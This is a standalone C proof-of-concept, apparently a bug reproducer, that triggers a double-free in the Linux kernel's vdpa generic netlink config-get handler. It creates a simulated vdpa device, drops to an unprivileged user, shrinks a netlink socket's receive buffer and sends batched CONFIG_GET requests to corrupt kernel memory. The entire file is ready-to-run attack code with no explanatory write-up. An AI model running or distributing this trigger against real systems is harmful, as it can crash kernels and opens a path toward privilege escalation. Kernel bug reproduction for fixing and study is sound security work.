// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <grp.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define VDPA_GENL_NAME "vdpa"

enum {
	VDPA_CMD_UNSPEC,
	VDPA_CMD_MGMTDEV_NEW,
	VDPA_CMD_MGMTDEV_GET,
	VDPA_CMD_DEV_NEW,
	VDPA_CMD_DEV_DEL,
	VDPA_CMD_DEV_GET,
	VDPA_CMD_DEV_CONFIG_GET,
	VDPA_CMD_DEV_VSTATS_GET,
	VDPA_CMD_DEV_ATTR_SET,
};

enum {
	VDPA_ATTR_UNSPEC,
	VDPA_ATTR_MGMTDEV_BUS_NAME,
	VDPA_ATTR_MGMTDEV_DEV_NAME,
	VDPA_ATTR_MGMTDEV_SUPPORTED_CLASSES,
	VDPA_ATTR_DEV_NAME,
	VDPA_ATTR_DEV_ID,
	VDPA_ATTR_DEV_VENDOR_ID,
	VDPA_ATTR_DEV_MAX_VQS,
	VDPA_ATTR_DEV_MAX_VQ_SIZE,
	VDPA_ATTR_DEV_MIN_VQ_SIZE,
};

#define DEV_NAME  "poc0"
#define MGMT_NAME "vdpasim_net"

static int nl_open(void)
{
	struct sockaddr_nl sa;
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0) {
		perror("[-] socket(AF_NETLINK, NETLINK_GENERIC)");
		exit(1);
	}
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("[-] bind");
		exit(1);
	}
	return fd;
}

static void *put_attr(void *p, int type, const void *data, int len)
{
	struct nlattr *na = (struct nlattr *)p;

	na->nla_type = type;
	na->nla_len = NLA_HDRLEN + len;
	memcpy((char *)na + NLA_HDRLEN, data, len);
	return (char *)p + NLA_ALIGN(na->nla_len);
}

static int build_msg(char *buf, int famid, int cmd, unsigned int seq,
		     int nattr, const int *types, const char **vals)
{
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh;
	void *p;
	int i;

	memset(buf, 0, 256);
	nlh->nlmsg_type = famid;
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_seq = seq;
	nlh->nlmsg_pid = 0;

	gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
	gh->cmd = cmd;
	gh->version = 1;

	p = (char *)gh + GENL_HDRLEN;
	for (i = 0; i < nattr; i++)
		p = put_attr(p, types[i], vals[i], strlen(vals[i]) + 1);

	nlh->nlmsg_len = (char *)p - buf;
	return nlh->nlmsg_len;
}

static int nl_send(int fd, const void *buf, int len)
{
	struct sockaddr_nl dst;

	memset(&dst, 0, sizeof(dst));
	dst.nl_family = AF_NETLINK;
	return sendto(fd, buf, len, 0, (struct sockaddr *)&dst, sizeof(dst));
}

static int resolve_family(int fd, const char *name)
{
	char buf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *gh;
	struct nlattr *na;
	int len, famid = -1;
	const int types[1] = { CTRL_ATTR_FAMILY_NAME };
	const char *vals[1];

	vals[0] = name;
	len = build_msg(buf, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 1, 1, types, vals);
	if (nl_send(fd, buf, len) < 0) {
		perror("[-] sendto(CTRL_CMD_GETFAMILY)");
		return -1;
	}

	len = recv(fd, buf, sizeof(buf), 0);
	if (len < 0) {
		perror("[-] recv(CTRL_CMD_GETFAMILY)");
		return -1;
	}
	if (nlh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);

		fprintf(stderr, "[-] GETFAMILY(%s) failed: %s\n", name,
			strerror(-e->error));
		return -1;
	}

	gh = (struct genlmsghdr *)NLMSG_DATA(nlh);
	na = (struct nlattr *)((char *)gh + GENL_HDRLEN);
	len -= NLMSG_LENGTH(GENL_HDRLEN);
	while (len >= (int)sizeof(*na) && na->nla_len >= sizeof(*na) &&
	       na->nla_len <= len) {
		if (na->nla_type == CTRL_ATTR_FAMILY_ID)
			famid = *(unsigned short *)((char *)na + NLA_HDRLEN);
		len -= NLA_ALIGN(na->nla_len);
		na = (struct nlattr *)((char *)na + NLA_ALIGN(na->nla_len));
	}
	return famid;
}

static int do_cmd(int fd, int famid, int cmd, int nattr, const int *types,
		  const char **vals)
{
	char buf[1024];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	int len;

	len = build_msg(buf, famid, cmd, 2, nattr, types, vals);
	nlh->nlmsg_flags |= NLM_F_ACK;
	if (nl_send(fd, buf, len) < 0) {
		perror("[-] sendto");
		return -1;
	}
	len = recv(fd, buf, sizeof(buf), 0);
	if (len < 0) {
		perror("[-] recv");
		return -1;
	}
	if (nlh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nlh);

		return e->error;
	}
	return 0;
}

#define NBATCH 64

int main(void)
{
	char batch[NBATCH * 256];
	char one[256];
	const int types2[2] = { VDPA_ATTR_MGMTDEV_DEV_NAME, VDPA_ATTR_DEV_NAME };
	const char *vals2[2] = { MGMT_NAME, DEV_NAME };
	const int types1[1] = { VDPA_ATTR_DEV_NAME };
	const char *vals1[1] = { DEV_NAME };
	int ctrl, atk, famid, err, i, off, len;
	int rcvbuf = 1;
	socklen_t sl;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	printf("[*] vdpa double-free PoC (vdpa_nl_cmd_dev_config_get_doit)\n");

	ctrl = nl_open();
	famid = resolve_family(ctrl, VDPA_GENL_NAME);
	if (famid < 0) {
		printf("[-] no \"vdpa\" generic netlink family "
		       "(CONFIG_VDPA not enabled?)\n");
		return 1;
	}
	printf("[+] vdpa genl family id = %d\n", famid);

	err = do_cmd(ctrl, famid, VDPA_CMD_DEV_NEW, 2, types2, vals2);
	if (err && err != -EEXIST) {
		printf("[-] VDPA_CMD_DEV_NEW failed: %d (%s)\n", err,
		       strerror(-err));
		return 1;
	}
	printf("[+] created vdpa device \"%s\" on mgmtdev \"%s\"\n",
	       DEV_NAME, MGMT_NAME);

	len = build_msg(one, famid, VDPA_CMD_DEV_CONFIG_GET, 3, 1, types1, vals1);
	if (nl_send(ctrl, one, len) < 0) {
		perror("[-] sendto(CONFIG_GET)");
		return 1;
	}
	len = recv(ctrl, one, sizeof(one), 0);
	printf("[+] warm-up CONFIG_GET reply: %d bytes, type %d\n", len,
	       ((struct nlmsghdr *)one)->nlmsg_type);
	if (((struct nlmsghdr *)one)->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA((struct nlmsghdr *)one);

		printf("[-] CONFIG_GET returned error %d (%s)\n", e->error,
		       strerror(-e->error));
		return 1;
	}

	if (setgroups(0, NULL) < 0)
		perror("[-] setgroups");
	if (setresgid(65534, 65534, 65534) < 0)
		perror("[-] setresgid");
	if (setresuid(65534, 65534, 65534) < 0)
		perror("[-] setresuid");
	printf("[+] dropped privileges: uid=%d euid=%d gid=%d\n", getuid(),
	       geteuid(), getgid());
	if (getuid() == 0)
		printf("[!] warning: still running as root\n");

	atk = nl_open();
	if (setsockopt(atk, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
		perror("[-] SO_RCVBUF");
	sl = sizeof(rcvbuf);
	getsockopt(atk, SOL_SOCKET, SO_RCVBUF, &rcvbuf, &sl);
	printf("[+] attack socket SO_RCVBUF = %d\n", rcvbuf);

	off = 0;
	for (i = 0; i < NBATCH; i++) {
		len = build_msg(batch + off, famid, VDPA_CMD_DEV_CONFIG_GET,
				100 + i, 1, types1, vals1);
		off += NLMSG_ALIGN(len);
	}
	printf("[*] firing %d batched VDPA_CMD_DEV_CONFIG_GET (%d bytes) ...\n",
	       NBATCH, off);

	if (nl_send(atk, batch, off) < 0)
		perror("[-] sendto(batch)");

	printf("[*] batch returned — if you can read this without a KASAN "
	       "splat, retrying\n");

	for (i = 0; i < 8; i++) {
		if (nl_send(atk, batch, off) < 0)
			perror("[-] sendto(batch retry)");
	}

	printf("[*] done\n");
	return 0;
}
